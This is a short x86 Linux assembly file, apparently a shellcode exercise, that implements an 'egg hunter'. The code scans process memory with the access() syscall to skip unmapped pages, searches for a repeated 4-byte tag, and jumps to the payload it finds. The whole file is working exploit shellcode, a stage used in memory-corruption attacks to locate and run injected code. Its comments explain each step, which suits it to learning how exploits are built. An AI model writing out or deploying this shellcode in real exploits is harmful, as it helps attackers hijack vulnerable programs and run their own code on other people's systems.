;Author: Ymir F. Eboras
;EGG_HUNTER_SHELLCODE


%define _EGG                0x50905090
%define _SYSCALL_ERR        0xf2 
%define __NR_access	    0x21


global _start

section .text

_start:

	xor ebx, ebx		;remove x00/NULL byte
	mov ebx, _EGG		;move the EGG tag into ebx register
	xor ecx, ecx		; 
	mul ecx


NEXT_PAGEFILE:
	 
	; move edx to new page after inc edx, PAGE_SIZE = 4096 (0x1000)

	or dx, 0xfff		;0xfff == 4095, 16 byte of edx

NEXT_ADDRESS:

	; int access(const char *pathname, int mode)
	; syscall 33 (0x21)
	; pathname == address of edx

	inc edx			
	pusha			;push eax, ebx, ecx, edx registers into the stack	
	lea ebx, [edx +4]
	xor eax, eax		;remove x00/NULL byte
	mov al, __NR_access	;syscall 33 for access
	int 0x80		;interrupt/execute


	; compare address
	
	cmp al, _SYSCALL_ERR	;compare return value of al to 0xf2 (EFAULT)
	popa                    ;pop original values of eax, ebx, ecx edx
	jz NEXT_PAGEFILE	;jump to NEXT_PAGEFILE if al return value == EFAULT value
	
	
	cmp [edx], ebx		;if al return value != EFAULT value, execute this instruction
	jnz NEXT_ADDRESS	;not EFAULT but _EGG not found, loop again

	cmp [edx +4], ebx	;_EGG found, test for the next 4 bytes of the _EGG
	jnz NEXT_ADDRESS	;if next 4 bytes of edx != ebx, loop again

	jmp edx			;finally, jmp to address of edx 
	
	
